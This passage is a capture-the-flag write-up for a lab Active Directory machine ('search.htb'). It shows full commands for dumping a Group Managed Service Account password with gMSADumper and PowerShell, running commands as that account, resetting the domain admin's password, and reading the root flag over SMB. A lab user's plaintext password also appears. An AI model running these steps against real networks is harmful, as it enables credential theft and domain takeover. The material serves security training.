![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/194CE262-0224-4370-92ED-0C4DC82DB6CE_2/25NCCGMxr9ZSQyCtMsPQMgmE6MnsOoBUyF8nIpI6VDoz/Image.png)

Now we need to input the credentials of ‘Sierra’ user and access PowerShell Console.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/885E4B41-0507-433F-BB8F-471A99B5F09F_2/2DFivWAbH4ac9PQ7n9M43UjhM5AWpxcyrgvU7SA4XnEz/Image.png)

After login we can run Powershell commands.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/2D395DFD-EBA0-4D0F-A11E-0E2B70FB0932_2/Z7w4gynvyEPP0ONtbMThh7SKcAn2ZDxXcORPx5WABA8z/Image.png)

Let’s go back to bloodhound and look for path from owned principle to domain admin.

![path_from_owned.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/6C069AB7-43BE-4749-8600-67D4516048F6_2/JoakukIHUpHbRieQxZZcx6vU2dFV2ZOVbzRGKGApzwQz/path_from_owned.png)

As we are member of ITSEC, we can read GMSA password.

> [BIR-ADFS-GMSA@SEARCH.HTB](BIR-ADFS-GMSA@SEARCH.HTB) is a Group Managed Service Account. The group [ITSEC@SEARCH.HTB](ITSEC@SEARCH.HTB) can retrieve the password for the GMSA [BIR-ADFS-GMSA@SEARCH.HTB](BIR-ADFS-GMSA@SEARCH.HTB).

```
🔥\> python3 ~/tools/gMSADumper/gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
```

gMSAs use 240-byte, randomly generated complex passwords. So, it’s hard to crack.

[PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password)

[Passwordless PowerShell](https://www.ephingadmin.com/PasswordlessPowerShell/)

#### GMSA Attributes in the Active Directory

- `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
- `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
- `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
- `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.

Based on these both blogs, we can run commands as BIR-ADFS-GMSA to set an environment to access domain admin

- $user = 'BIR-ADFS-GMSA$'
- $gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword'
- $blob = $gmsa.'msDS-ManagedPassword'
- $mp = ConvertFrom-ADManagedPasswordBlob $blob
- $cred = New-Object System.Management.Automation.PSCredential $user, $mp.SecureCurrentPassword

With these above we are setting up the GMSA password to be used and runas 'BIR-ADFS-GMSA$’ user.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/CB4E35B1-B95E-4725-A6CD-F59AB5BA3E39_2/ua9wO5FDzmuACoyzVk9zmUy6rLCyvVkn2lJlEnxM2jYz/Image.png)

Everything is set, now we need to invoke commands to run any type of script/command.

- Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}

For that we will use above command to know which user access we have right now.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/FD91C757-2E61-457A-B8C9-297160515404_2/OhxB8eFtfqDyDUlgjhx5yaAGEjqgupejaNOlMiMYlAAz/Image.png)

As you can see ‘whoami’ result is showing that we are ‘BIR-ADFS-GMSA$’ user, not ‘Sierra’. Let’s look into Bloodhound one more time.

![shortest_path_to_admin_2.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/5F6B4553-08CF-45CC-86E7-94F42FDE792C_2/ppvQeXxUs7mXGqFPeEzmM61EVyAs8DdirlaUn8uP7xEz/shortest_path_to_admin_2.png)

Let’s look into help of ‘Generic all’.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/F46D2421-C5AB-46B9-A833-B7660BAC9A85_2/32tJ97VgBPvZpyYT6F6DxuH32CVSlt6WxV2zNOBKOKMz/Image.png)

As you can see ‘Generic All’ privileges simply means full control over ‘Tristan’ user, who is also a domain admin. Let’s change the domain admin password.

- Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user Tristan.Davies qwerty1234 /domain}

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/A7BB8A2F-2A34-4D0E-926E-65C875EAF485_2/9HXl6vJuilIPi2Ihd0HKi8uksuvCs4hgI4eBl1WT5zcz/Image.png)

Now we can access admin directory to read the root flag.

```
🔥\> smbclient //search.htb/C$ -U Tristan.Davies
Enter WORKGROUP\Tristan.Davies's password:
Try "help" to get a list of possible commands.
smb: \> ls
  $RECYCLE.BIN                     DHSc        0  Mon Mar 23 19:24:13 2020
  Config.Msi                       DHSc        0  Thu Dec 16 17:08:46 2021
  Documents and Settings          DHSrn        0  Sun Mar 22 23:46:47 2020
  HelpDesk                           Dc        0  Tue Apr 14 10:24:23 2020
  inetpub                            Dc        0  Mon Mar 23 07:20:20 2020
  pagefile.sys                      AHS 738197504  Mon Jan  3 07:18:09 2022
  PerfLogs                           Dc        0  Thu Jul 30 14:43:39 2020
  Program Files                     DRc        0  Thu Dec 16 17:07:44 2021
  Program Files (x86)                Dc        0  Sat Sep 15 07:21:46 2018
  ProgramData                      DHcn        0  Tue Apr 14 10:24:03 2020
  Recovery                        DHScn        0  Sun Mar 22 23:46:48 2020
  RedirectedFolders                  Dc        0  Mon Jan  3 07:55:00 2022
  System Volume Information         DHS        0  Tue Mar 31 14:13:38 2020
  Users                             DRc        0  Tue Aug 11 07:45:30 2020
  Windows                            Dc        0  Mon Dec 20 08:10:02 2021

                3246079 blocks of size 4096. 534471 blocks available

smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

